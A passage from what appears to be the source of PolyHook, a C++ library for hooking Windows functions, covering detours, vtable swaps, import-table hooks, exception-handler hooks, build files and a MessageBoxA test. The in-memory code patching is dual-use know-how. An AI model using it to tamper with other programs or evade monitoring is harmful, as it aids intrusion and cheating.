	WriteAbsoluteJMP((uintptr_t)&m_Trampoline[m_hkLength], (uintptr_t)m_hkSrc + m_hkLength);
	m_hkLength += 16; //Size of the above absolute jmp
	RelocateASM(m_Trampoline, &m_hkLength, (uintptr_t)m_hkSrc, (uintptr_t)m_Trampoline);
	//Write the jmp from our trampoline back to the original

	// Build a far jump to the Destination function. (jmps not to address pointed at but to the value in the address)
	MemoryProtect Protector(m_hkSrc, m_hkLength, PAGE_EXECUTE_READWRITE);
	int HookSize = 0;
	if (UseRelativeJmp)
	{
		HookSize = 6;
		m_hkSrc[0] = 0xFF;
		m_hkSrc[1] = 0x25;
		//Write 32Bit Displacement from rip
		*(long*)(m_hkSrc + 2) = CalculateRelativeDisplacement<long>((uintptr_t)m_hkSrc, (uintptr_t)&m_Trampoline[m_hkLength + 16], 6);
		*(uintptr_t*)&m_Trampoline[m_hkLength + 16] = (uintptr_t)m_hkDest; //Write the address into memory at [RIP+Displacement]
	}
	else {
		HookSize = 16;
		WriteAbsoluteJMP((uintptr_t)m_hkSrc, (uintptr_t)m_hkDest);
	}
	//Nop Extra bytes from overwritten opcode
	for (uint_fast16_t i = HookSize; i < m_OriginalLength; i++)
		m_hkSrc[i] = 0x90;

	//Done hooking, resume threads and flush cache (cache flush is usually just a no-op)
	ThreadMngr.ResumeThreads();
	FlushInstructionCache(GetCurrentProcess(), m_hkSrc, m_hkLength);
	m_Hooked = true;
	PostError(RuntimeError(RuntimeError::Severity::Warning, "PolyHook x64Detour: Relocation can be out of range"));
	return true;
}

x86_reg PLH::X64Detour::GetIpReg()
{
	return X86_REG_RIP;
}

void PLH::X64Detour::FreeTrampoline()
{
	if (m_NeedFree)
	{
		VirtualFree(m_Trampoline, 0, MEM_RELEASE);
		m_NeedFree = false;
	}
}

void PLH::X64Detour::WriteAbsoluteJMP(const uintptr_t Destination, const uintptr_t JMPDestination)
{
	/*push rax
	mov rax ...   //Address to original
	xchg qword ptr ss:[rsp], rax
	ret*/
	uint8_t detour[] = { 0x50, 0x48, 0xB8, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0x48, 0x87, 0x04, 0x24, 0xC3 };
	memcpy((uint8_t*)Destination, detour, sizeof(detour));
	*(uintptr_t*)&((uint8_t*)Destination)[3] = JMPDestination;
}

void PLH::X64Detour::WriteJMP(const uintptr_t From, const uintptr_t To)
{
	WriteAbsoluteJMP(From, To);
}

int PLH::X64Detour::GetJMPSize()
{
	return 16;
}
#endif

/*----------------------------------------------*/
PLH::HookType PLH::VFuncSwap::GetType()
{
	return PLH::HookType::VFuncSwap;
}

bool PLH::VFuncSwap::Hook()
{
	MemoryProtect Protector(&m_hkVtable[m_hkIndex], sizeof(void*), PAGE_READWRITE);
	m_OrigVFunc = m_hkVtable[m_hkIndex];
	m_hkVtable[m_hkIndex] = m_hkDest;
	m_Hooked = true;
	return true;
}

void PLH::VFuncSwap::UnHook()
{
	MemoryProtect Protector(&m_hkVtable[m_hkIndex], sizeof(void*), PAGE_READWRITE);
	m_hkVtable[m_hkIndex] = m_OrigVFunc;
	m_Hooked = false;
}

void PLH::VFuncSwap::SetupHook(uint8_t** Vtable, const uint_fast16_t Index, uint8_t* Dest)
{
	m_hkVtable = Vtable;
	m_hkDest = Dest;
	m_hkIndex = Index;
}

PLH::VFuncSwap::VFuncSwap() : m_Hooked(false)
{

}

PLH::VFuncSwap::~VFuncSwap()
{
	if (m_Hooked)
		UnHook();
}
/*----------------------------------------------*/
PLH::VFuncDetour::VFuncDetour() :IHook()
{
	m_Detour = std::make_unique<Detour>();
}

PLH::VFuncDetour::~VFuncDetour()
{

}

PLH::HookType PLH::VFuncDetour::GetType()
{
	return PLH::HookType::VFuncDetour;
}

bool PLH::VFuncDetour::Hook()
{
	return m_Detour->Hook();
}

void PLH::VFuncDetour::UnHook()
{
	m_Detour->UnHook();
}

void PLH::VFuncDetour::SetupHook(uint8_t** Vtable, const uint_fast16_t Index, uint8_t* Dest)
{
	m_Detour->SetupHook(Vtable[Index], Dest);
}

PLH::RuntimeError PLH::VFuncDetour::GetLastError() const
{
	return m_Detour->GetLastError();
}

void PLH::VFuncDetour::PostError(const RuntimeError& Err)
{
	m_Detour->PostError(Err);
}
/*----------------------------------------------*/
PLH::VTableSwap::VTableSwap() :IHook(), m_NeedFree(false), m_Hooked(false)
{

}

PLH::VTableSwap::~VTableSwap()
{
	if (m_Hooked)
		UnHook();

	if (m_NeedFree)
		FreeNewVtable();
}

PLH::HookType PLH::VTableSwap::GetType()
{
	return PLH::HookType::VTableSwap;
}

bool PLH::VTableSwap::Hook()
{
	MemoryProtect Protector(m_phkClass, sizeof(void*), PAGE_READWRITE);
	m_OrigVtable = *m_phkClass;
	m_hkOriginal = m_OrigVtable[m_hkIndex];
	m_VFuncCount = GetVFuncCount(m_OrigVtable);
	m_NewVtable = (uint8_t**) new uintptr_t[m_VFuncCount];
	m_NeedFree = true;
	memcpy(m_NewVtable, m_OrigVtable, sizeof(void*)*m_VFuncCount);
	*m_phkClass = m_NewVtable;
	m_NewVtable[m_hkIndex] = m_hkDest;
	m_Hooked = true;
	return true;
}

void PLH::VTableSwap::UnHook()
{
	MemoryProtect Protector(m_phkClass, sizeof(void*), PAGE_READWRITE);
	*m_phkClass = m_OrigVtable;
	FreeNewVtable();
	m_Hooked = false;
}

void PLH::VTableSwap::SetupHook(uint8_t* pClass, const uint_fast16_t Index, uint8_t* Dest)
{
	m_phkClass = (BYTE***)pClass; //ppp is just convenient to work with
	m_hkDest = Dest;
	m_hkIndex = Index;
}

uint_fast16_t PLH::VTableSwap::GetVFuncCount(uint8_t** pVtable)
{
	int FuncCount = 0;
	for (; ; FuncCount++)
	{
		if (!IsValidPtr(pVtable[FuncCount]))
			break;
	}
	return FuncCount;
}

void PLH::VTableSwap::FreeNewVtable()
{
	if (m_NeedFree)
	{
		delete[] m_NewVtable;
		m_NeedFree = false;
	}
}

/*----------------------------------------------*/
PLH::HookType PLH::IATHook::GetType()
{
	return PLH::HookType::IAT;
}

PLH::IATHook::IATHook() : m_Hooked(false)
{

}

PLH::IATHook::~IATHook()
{
	if (m_Hooked)
		UnHook();
}

bool PLH::IATHook::Hook()
{
	PIMAGE_THUNK_DATA Thunk;
	if (!FindIATFunc(m_hkLibraryName.c_str(), m_hkSrcFunc.c_str(), &Thunk, m_hkModuleName.c_str()))
	{
		PostError(RuntimeError(RuntimeError::Severity::UnRecoverable, "PolyHook IATHook: Failed to find import"));
		return false;
	}

	MemoryProtect Protector(Thunk, sizeof(uintptr_t), PAGE_EXECUTE_READWRITE);
	m_pIATFuncOrig = (void*)Thunk->u1.Function;
	Thunk->u1.Function = (uintptr_t)m_hkDest;
	m_Hooked = true;
	return true;
}

void PLH::IATHook::UnHook()
{
	PIMAGE_THUNK_DATA Thunk;
	if (!FindIATFunc(m_hkLibraryName.c_str(), m_hkSrcFunc.c_str(), &Thunk))
		return;

	MemoryProtect Protector(Thunk, sizeof(ULONG_PTR), PAGE_EXECUTE_READWRITE);
	Thunk->u1.Function = (ULONG_PTR)m_pIATFuncOrig;
	m_Hooked = false;
}

void PLH::IATHook::SetupHook(const char* LibraryName, const char* SrcFunc, uint8_t* Dest, const char* Module)
{
	m_hkLibraryName = LibraryName;
	m_hkSrcFunc = SrcFunc;
	m_hkModuleName = Module;
	m_hkDest = Dest;
}

bool PLH::IATHook::FindIATFunc(const char* LibraryName, const char* FuncName, PIMAGE_THUNK_DATA* pFuncThunkOut, const char* Module)
{
	bool UseModuleName = true;
	if (Module == NULL || Module[0] == '\0') //we received a null module
		UseModuleName = false;

	//Use the module given to us, otherwise use our process base (NULL)
	HINSTANCE hInst = GetModuleHandleA(UseModuleName ? Module : NULL);
	if (!hInst)
	{
		PostError(RuntimeError(RuntimeError::Severity::UnRecoverable, "PolyHook IATHook:Failed to find Module"));
		return false;
	}

	//Get import name table
	ULONG Sz;
	PIMAGE_IMPORT_DESCRIPTOR pImports = (PIMAGE_IMPORT_DESCRIPTOR)
		ImageDirectoryEntryToDataEx(hInst, TRUE, IMAGE_DIRECTORY_ENTRY_IMPORT, &Sz, nullptr);

	for (uint_fast16_t i = 0; pImports[i].Characteristics != 0; i++)
	{
		//Check if we have the correct library (ex: kernel32.dll)
		char* _ModuleName = (char*)ResolveRVA(hInst, pImports[i].Name);
		if (_stricmp(_ModuleName, LibraryName) != 0)
			continue;

		//Original holds the API Names
		PIMAGE_THUNK_DATA pOriginalThunk = (PIMAGE_THUNK_DATA)
			ResolveRVA(hInst, pImports[i].OriginalFirstThunk);

		//FirstThunk is overwritten by loader with API addresses, we change this
		PIMAGE_THUNK_DATA pThunk = (PIMAGE_THUNK_DATA)
			ResolveRVA(hInst, pImports[i].FirstThunk);

		if (!pOriginalThunk)
		{
			PostError(RuntimeError(RuntimeError::Severity::Critical, "PolyHook IATHook:PE Files without OriginalFirstThunk are unsupported"));
			return false;
		}

		//Table is null terminated, increment both tables
		for (; pOriginalThunk->u1.Function != NULL; pOriginalThunk++, pThunk++)
		{
			if (IMAGE_SNAP_BY_ORDINAL(pOriginalThunk->u1.Ordinal))
			{
				PLH::Tools::XTrace("Import By Ordinal:[Ordinal:%d]\n", IMAGE_ORDINAL(pOriginalThunk->u1.Ordinal));
				continue;
			}

			PIMAGE_IMPORT_BY_NAME pImport = (PIMAGE_IMPORT_BY_NAME)
				ResolveRVA(hInst, pOriginalThunk->u1.AddressOfData);

			PLH::Tools::XTrace("Import By Name: [Ordinal:%d] [Name:%s]\n", IMAGE_ORDINAL(pOriginalThunk->u1.Ordinal), pImport->Name);

			//Check the name of API given by OriginalFirthThunk (Ex: CreateThread)
			if (_stricmp(FuncName, pImport->Name) != 0)
				continue;

			/*Name matched in OriginalFirstThunk, return FirstThunk
			so we can changed it's address later*/
			*pFuncThunkOut = pThunk;
			return true;
		}
	}
	PostError(RuntimeError(RuntimeError::Severity::UnRecoverable, "PolyHook IATHook:Failed to find import"));
	return false;
}

/*----------------------------------------------*/
PLH::HookType PLH::VEHHook::GetType()
{
	return PLH::HookType::VEH;
}

std::vector<PLH::VEHHook::HookCtx> PLH::VEHHook::m_HookTargets;
std::mutex PLH::VEHHook::m_TargetMutex;
PLH::VEHHook::VEHHook() : m_Hooked(false)
{
	//Get size of pages
	SYSTEM_INFO si;
	GetSystemInfo(&si);
	m_PageSize = si.dwPageSize;

	void* pVEH = AddVectoredExceptionHandler(1, &PLH::VEHHook::VEHHandler);
	if (pVEH == nullptr)
	{
		PostError(RuntimeError(RuntimeError::Severity::UnRecoverable, "PolyHook VEH: Failed to create top level handler"));
	}
}

PLH::VEHHook::~VEHHook()
{
	if (m_Hooked)
		UnHook();
}

bool PLH::VEHHook::AreInSamePage(const uint8_t* Addr1, const uint8_t* Addr2)
{
	//If VQ fails, be safe and say they are in same page
	MEMORY_BASIC_INFORMATION mbi1;
	if (!VirtualQuery(Addr1, &mbi1, sizeof(mbi1)))
		return true;

	MEMORY_BASIC_INFORMATION mbi2;
	if (!VirtualQuery(Addr2, &mbi2, sizeof(mbi2)))
		return true;

	if (mbi1.BaseAddress == mbi2.BaseAddress)
		return true;

	return false;
}

void PLH::VEHHook::SetupHook(uint8_t* Src, uint8_t* Dest, VEHMethod Method)
{
	HookCtx Ctx(Src, Dest, Method);
	m_ThisCtx = Ctx;
}

bool PLH::VEHHook::Hook()
{
	//Lock the TargetMutex for thread safe vector operations
	std::lock_guard<std::mutex> m_Lock(m_TargetMutex);

	if (m_ThisCtx.m_Type == VEHMethod::INT3_BP)
	{
		//Write INT3 BreakPoint
		MemoryProtect Protector(m_ThisCtx.m_Src, 1, PAGE_EXECUTE_READWRITE);
		m_ThisCtx.m_StorageByte = *m_ThisCtx.m_Src;
		*m_ThisCtx.m_Src = 0xCC;
		m_HookTargets.push_back(m_ThisCtx);
	}
	else if (m_ThisCtx.m_Type == VEHMethod::HARDWARE_BP) {
		CONTEXT Ctx;
		Ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;

		if (!GetThreadContext(GetCurrentThread(), &Ctx))
		{
			PostError(PLH::RuntimeError(RuntimeError::Severity::Critical, "Failed to get context"));
			return false;
		}

		uint8_t RegIndex = 0;
		bool FoundReg = false;
		for (; RegIndex < 4; RegIndex++)
		{
			if ((Ctx.Dr7 & (1 << (RegIndex * 2))) == 0)
			{
				FoundReg = true;
				break;
			}
		}
		if (!FoundReg)
		{
			PostError(PLH::RuntimeError(RuntimeError::Severity::Critical, "Failed to find free Reg"));
			return false;
		}

		switch (RegIndex)
		{
		case 0:
			Ctx.Dr0 = (DWORD_PTR)m_ThisCtx.m_Src;
			break;
		case 1:
			Ctx.Dr1 = (DWORD_PTR)m_ThisCtx.m_Src;
			break;
		case 2:
			Ctx.Dr2 = (DWORD_PTR)m_ThisCtx.m_Src;
			break;
		case 3:
			Ctx.Dr3 = (DWORD_PTR)m_ThisCtx.m_Src;
			break;
		default:
			PostError(PLH::RuntimeError(RuntimeError::Severity::Critical, "PolyHook VEH: Invalid Debug Register Index"));
			return false;
		}
		//Turn a local register on
		Ctx.Dr7 |= 1 << (2 * RegIndex);
		m_ThisCtx.m_StorageByte = RegIndex;
		//Still need to call suspend thread *TODO*
		if (!SetThreadContext(GetCurrentThread(), &Ctx))
		{
			PostError(PLH::RuntimeError(RuntimeError::Severity::Critical, "PolyHook VEH: Failed to set thread context"));
			return false;
		}
		m_HookTargets.push_back(m_ThisCtx);
	}
	else if (m_ThisCtx.m_Type == VEHMethod::GUARD_PAGE) {
		//Read current page protection
		MEMORY_BASIC_INFORMATION mbi;
		VirtualQuery(m_ThisCtx.m_Src, &mbi, sizeof(mbi));

		//can't use Page Guards with NO_ACCESS flag
		if (mbi.Protect & PAGE_NOACCESS)
		{
			PostError(RuntimeError(RuntimeError::Severity::UnRecoverable, "PolyHook VEH: Cannot hook page with NOACCESS Flag"));
			return false;
		}

		if (AreInSamePage((BYTE*)&PLH::VEHHook::VEHHandler, m_ThisCtx.m_Src))
		{
			PostError(RuntimeError(RuntimeError::Severity::UnRecoverable, "PolyHook VEH: Cannot hook page on same page as the VEH"));
			return false;
		}

		//!!!!COMPILER SPECIFIC HACK HERE!!!!!
		bool(PLH::VEHHook::* pHookFunc)(void) = &PLH::VEHHook::Hook;
		if (AreInSamePage((BYTE*&)pHookFunc, m_ThisCtx.m_Src))
		{
			PostError(RuntimeError(RuntimeError::Severity::UnRecoverable, "PolyHook VEH: Cannot hook page on same page as the hooking function"));
			return false;
		}

		m_HookTargets.push_back(m_ThisCtx);

		//Write Page Guard protection
		DWORD OldProtection;
		VirtualProtect(m_ThisCtx.m_Src, 1, PAGE_EXECUTE_READWRITE | PAGE_GUARD, &OldProtection);
	}
	m_Hooked = true;
	return true;
}

void PLH::VEHHook::UnHook()
{
	std::lock_guard<std::mutex> m_Lock(m_TargetMutex);

	if (m_ThisCtx.m_Type == VEHMethod::INT3_BP)
	{
		MemoryProtect Protector(m_ThisCtx.m_Src, 1, PAGE_EXECUTE_READWRITE);
		*m_ThisCtx.m_Src = m_ThisCtx.m_StorageByte;
	}
	else if (m_ThisCtx.m_Type == VEHMethod::HARDWARE_BP) {
		CONTEXT Ctx;
		Ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
		if (!GetThreadContext(GetCurrentThread(), &Ctx))
		{
			PostError(PLH::RuntimeError(RuntimeError::Severity::Critical, "Failed to get context"));
			return;
		}
		Ctx.Dr7 &= ~(1 << (2 * m_ThisCtx.m_StorageByte));
		//Still need to call suspend thread
		if (!SetThreadContext(GetCurrentThread(), &Ctx))
		{
			PostError(PLH::RuntimeError(RuntimeError::Severity::Critical, "Failed to set context"));
			return;
		}
	}
	else if (m_ThisCtx.m_Type == VEHMethod::GUARD_PAGE) {
		/*Force an exception, catch it, continue execution, and don't restore protection.
		This effectively unhooks this type of hook, mark volatile so compiler doesn't optimize read away*/
		volatile BYTE GenerateExceptionRead = *m_ThisCtx.m_Src;
	}
	m_HookTargets.erase(std::remove(m_HookTargets.begin(), m_HookTargets.end(), m_ThisCtx), m_HookTargets.end());
	m_Hooked = false;
}

LONG CALLBACK PLH::VEHHook::VEHHandler(EXCEPTION_POINTERS* ExceptionInfo)
{
#ifdef _WIN64
#define XIP Rip
#else
#define XIP Eip
#endif // _WIN64
	std::lock_guard<std::mutex> m_Lock(m_TargetMutex);

	DWORD ExceptionCode = ExceptionInfo->ExceptionRecord->ExceptionCode;
	if (ExceptionCode == EXCEPTION_BREAKPOINT)
	{
		for (HookCtx& Ctx : m_HookTargets)
		{
			if (Ctx.m_Type != VEHMethod::INT3_BP)
				continue;

			//Are we at a breakpoint that we placed?
			if (ExceptionInfo->ContextRecord->XIP != (DWORD_PTR)Ctx.m_Src)
				continue;

			//Remove Int3 Breakpoint
			MemoryProtect Protector(Ctx.m_Src, 1, PAGE_EXECUTE_READWRITE);
			*Ctx.m_Src = Ctx.m_StorageByte;

			//Set instruction pointer to our callback
			ExceptionInfo->ContextRecord->XIP = (DWORD_PTR)Ctx.m_Dest;
			return EXCEPTION_CONTINUE_EXECUTION;
		}
	}
	else if (ExceptionCode == EXCEPTION_SINGLE_STEP) {
		//Intel says clear Dr6, windows may do it for us, lets be safe
		ExceptionInfo->ContextRecord->Dr6 = 0;
		for (HookCtx& Ctx : m_HookTargets)
		{
			if (Ctx.m_Type != VEHMethod::HARDWARE_BP)
				continue;

			//Are we at a breakpoint that we placed?
			if (ExceptionInfo->ContextRecord->XIP != (DWORD_PTR)Ctx.m_Src)
				continue;

			//Clear the Debug Register
			ExceptionInfo->ContextRecord->Dr7 &= ~(1 << (2 * Ctx.m_StorageByte));

			//Set instruction pointer to callback
			ExceptionInfo->ContextRecord->XIP = (DWORD_PTR)Ctx.m_Dest;
			return EXCEPTION_CONTINUE_EXECUTION;
		}
	}
	else if (ExceptionCode == EXCEPTION_GUARD_PAGE) {
		for (HookCtx& Ctx : m_HookTargets)
		{
			//still need to check if exception is in our page
			if (Ctx.m_Type != VEHMethod::GUARD_PAGE)
				continue;

			if (!AreInSamePage((uint8_t*)ExceptionInfo->ContextRecord->XIP, Ctx.m_Src))
				continue;

			if (ExceptionInfo->ContextRecord->XIP == (uintptr_t)Ctx.m_Src)
				ExceptionInfo->ContextRecord->XIP = (uintptr_t)Ctx.m_Dest;

			return EXCEPTION_CONTINUE_EXECUTION;
		}
	}
	return EXCEPTION_CONTINUE_SEARCH;
}

/*----------------------------------------------*/
PLH::MemoryProtect::MemoryProtect(void* Address, size_t Size, DWORD ProtectionFlags)
{
	m_Address = Address;
	m_Size = Size;
	m_Flags = ProtectionFlags;
	Protect(m_Address, m_Size, m_Flags);
}

bool PLH::MemoryProtect::Protect(void* Address, size_t Size, DWORD ProtectionFlags)
{
	return VirtualProtect(Address, Size, ProtectionFlags, &m_OldProtection);
}

PLH::MemoryProtect::~MemoryProtect()
{
	Protect(m_Address, m_Size, m_OldProtection);
}

#endif//end include guard
```

`libs/PolyHook/PolyHook.vcxproj`:

```vcxproj
<?xml version="1.0" encoding="utf-8"?>
<Project DefaultTargets="Build" ToolsVersion="14.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup Label="ProjectConfigurations">
    <ProjectConfiguration Include="Debug|Win32">
      <Configuration>Debug</Configuration>
      <Platform>Win32</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release|Win32">
      <Configuration>Release</Configuration>
      <Platform>Win32</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Debug|x64">
      <Configuration>Debug</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release|x64">
      <Configuration>Release</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
  </ItemGroup>
  <PropertyGroup Label="Globals">
    <ProjectGuid>{64269F60-A538-4327-82EE-AB4BF4766CE9}</ProjectGuid>
    <Keyword>Win32Proj</Keyword>
    <RootNamespace>PolyHook</RootNamespace>
    <WindowsTargetPlatformVersion>8.1</WindowsTargetPlatformVersion>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.Default.props" />
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>true</UseDebugLibraries>
    <PlatformToolset>v140</PlatformToolset>
    <CharacterSet>MultiByte</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>v140</PlatformToolset>
    <WholeProgramOptimization>true</WholeProgramOptimization>
    <CharacterSet>MultiByte</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>true</UseDebugLibraries>
    <PlatformToolset>v140</PlatformToolset>
    <CharacterSet>MultiByte</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>v140</PlatformToolset>
    <WholeProgramOptimization>true</WholeProgramOptimization>
    <CharacterSet>MultiByte</CharacterSet>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.props" />
  <ImportGroup Label="ExtensionSettings">
  </ImportGroup>
  <ImportGroup Label="Shared">
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <PropertyGroup Label="UserMacros" />
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <LinkIncremental>true</LinkIncremental>
    <IncludePath>$(IncludePath)</IncludePath>
    <LibraryPath>../Capstone/msvc/x86/Debug;$(LibraryPath)</LibraryPath>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <LinkIncremental>true</LinkIncremental>
    <IncludePath>$(IncludePath)</IncludePath>
    <LibraryPath>../Capstone/msvc/x64/Debug;$(LibraryPath)</LibraryPath>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <LinkIncremental>false</LinkIncremental>
    <IncludePath>$(IncludePath)</IncludePath>
    <LibraryPath>../Capstone/msvc/x86/Release;$(LibraryPath)</LibraryPath>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <LinkIncremental>false</LinkIncremental>
    <IncludePath>$(IncludePath)</IncludePath>
    <LibraryPath>../Capstone/msvc/x64/Release;$(LibraryPath)</LibraryPath>
  </PropertyGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <ClCompile>
      <PrecompiledHeader>NotUsing</PrecompiledHeader>
      <WarningLevel>Level3</WarningLevel>
      <Optimization>Disabled</Optimization>
      <PreprocessorDefinitions>WIN32;_DEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <SDLCheck>true</SDLCheck>
      <RuntimeLibrary>MultiThreadedDebug</RuntimeLibrary>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <ClCompile>
      <PrecompiledHeader>NotUsing</PrecompiledHeader>
      <WarningLevel>Level3</WarningLevel>
      <Optimization>Disabled</Optimization>
      <PreprocessorDefinitions>_DEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <SDLCheck>true</SDLCheck>
      <RuntimeLibrary>MultiThreadedDebug</RuntimeLibrary>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <PrecompiledHeader>NotUsing</PrecompiledHeader>
      <Optimization>Full</Optimization>
      <FunctionLevelLinking>true</FunctionLevelLinking>
      <IntrinsicFunctions>true</IntrinsicFunctions>
      <PreprocessorDefinitions>WIN32;NDEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <SDLCheck>true</SDLCheck>
      <RuntimeLibrary>MultiThreaded</RuntimeLibrary>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <GenerateDebugInformation>true</GenerateDebugInformation>
      <EnableCOMDATFolding>true</EnableCOMDATFolding>
      <OptimizeReferences>true</OptimizeReferences>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <PrecompiledHeader>NotUsing</PrecompiledHeader>
      <Optimization>Full</Optimization>
      <FunctionLevelLinking>true</FunctionLevelLinking>
      <IntrinsicFunctions>true</IntrinsicFunctions>
      <PreprocessorDefinitions>NDEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <SDLCheck>true</SDLCheck>
      <RuntimeLibrary>MultiThreaded</RuntimeLibrary>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <GenerateDebugInformation>true</GenerateDebugInformation>
      <EnableCOMDATFolding>true</EnableCOMDATFolding>
      <OptimizeReferences>true</OptimizeReferences>
    </Link>
  </ItemDefinitionGroup>
  <ItemGroup>
    <Text Include="ReadMe.txt" />
  </ItemGroup>
  <ItemGroup>
    <ClInclude Include="CatchUnitTest.h" />
    <ClInclude Include="PolyHook.hpp" />
  </ItemGroup>
  <ItemGroup>
    <ClCompile Include="Tests.cpp" />
  </ItemGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.targets" />
  <ImportGroup Label="ExtensionTargets">
  </ImportGroup>
</Project>
```

`libs/PolyHook/PolyHook.vcxproj.filters`:

```filters
<?xml version="1.0" encoding="utf-8"?>
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup>
    <Filter Include="Source Files">
      <UniqueIdentifier>{4FC737F1-C7A5-4376-A066-2A32D752A2FF}</UniqueIdentifier>
      <Extensions>cpp;c;cc;cxx;def;odl;idl;hpj;bat;asm;asmx</Extensions>
    </Filter>
    <Filter Include="Header Files">
      <UniqueIdentifier>{93995380-89BD-4b04-88EB-625FBE52EBFB}</UniqueIdentifier>
      <Extensions>h;hh;hpp;hxx;hm;inl;inc;xsd</Extensions>
    </Filter>
    <Filter Include="Resource Files">
      <UniqueIdentifier>{67DA6AB6-F800-4c08-8B7A-83BB121AAD01}</UniqueIdentifier>
      <Extensions>rc;ico;cur;bmp;dlg;rc2;rct;bin;rgs;gif;jpg;jpeg;jpe;resx;tiff;tif;png;wav;mfcribbon-ms</Extensions>
    </Filter>
  </ItemGroup>
  <ItemGroup>
    <Text Include="ReadMe.txt" />
  </ItemGroup>
  <ItemGroup>
    <ClInclude Include="CatchUnitTest.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="PolyHook.hpp">
      <Filter>Header Files</Filter>
    </ClInclude>
  </ItemGroup>
  <ItemGroup>
    <ClCompile Include="Tests.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
  </ItemGroup>
</Project>
```

`libs/PolyHook/Tests.cpp`:

```cpp
// PolyHook.cpp : Defines the entry point for the console application.
//
#include "PolyHook.hpp"
#define CATCH_CONFIG_MAIN
#include "CatchUnitTest.h"

decltype(&MessageBoxA) oMessageBoxA;
int WINAPI hkMessageBoxA(HWND hWnd, LPCSTR lpText, LPCSTR lpCaption, UINT uType)
{
	int Result = oMessageBoxA(hWnd, "Hooked", lpCaption, uType);
	REQUIRE(strcmp("Message",lpText) == 0);
	return -10;
}

TEST_CASE("Hooks MessageBox", "[Detours]")
{
	std::shared_ptr<PLH::Detour> Detour_Ex(new PLH::Detour);
	REQUIRE(Detour_Ex->GetType() == PLH::HookType::Detour);

	Detour_Ex->SetupHook((BYTE*)&MessageBoxA,(BYTE*) &hkMessageBoxA); //can cast to byte* to
	REQUIRE( Detour_Ex->Hook() );
	oMessageBoxA = Detour_Ex->GetOriginal<decltype(&MessageBoxA)>();

